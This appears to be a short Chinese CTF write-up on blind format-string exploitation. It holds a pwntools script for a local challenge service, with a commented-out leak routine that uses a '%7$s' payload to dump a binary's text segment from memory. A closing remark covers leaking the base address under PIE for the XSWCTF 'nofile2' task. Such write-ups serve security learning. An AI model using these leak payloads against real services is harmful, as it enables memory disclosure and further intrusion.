---
title: 盲打fmt
date: '2025-11-17 13:12:42'
updated: '2025-12-27 17:19:00'
---
# dump elf
```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote('127.0.0.1',36603)

link.recvuntil(b'answer')
link.send(b'y0u_kn0w_c6c?')

link.interactive()

# def leak(addr):
#     payload=b'%7$sbabe'+p64(addr)
#     link.sendafter(b'answer\n',payload)
#     success('leak addr: '+hex(addr))
#     # print(link.recvline())
#     ret=link.recvuntil(b'babe',drop=True)
#     print(ret)
#     # sleep(1)
#     return ret

# begin=0x400000
# text_seg =b''
# try:
#     while True:
#         ret=leak(begin)
#         text_seg+=ret
#         begin+=len(ret)
#         if len(ret)==0:
#             begin+=1
#             text_seg+=b'\x00'
# except Exception as e:
#     print(e)
# finally:
#     success('dump done, size: ' + hex(len(text_seg)))
#     with open('dump_bin','wb') as f:
#         f.write(text_seg)
```

## 2.0
XSWCTF 当中的 nofile2，因为程序开了 PIE，所以没法直接从标准的基址开始 dump 程序，需要先从栈上泄露出来程序地址，然后低一个半字节置空获取 binarybase

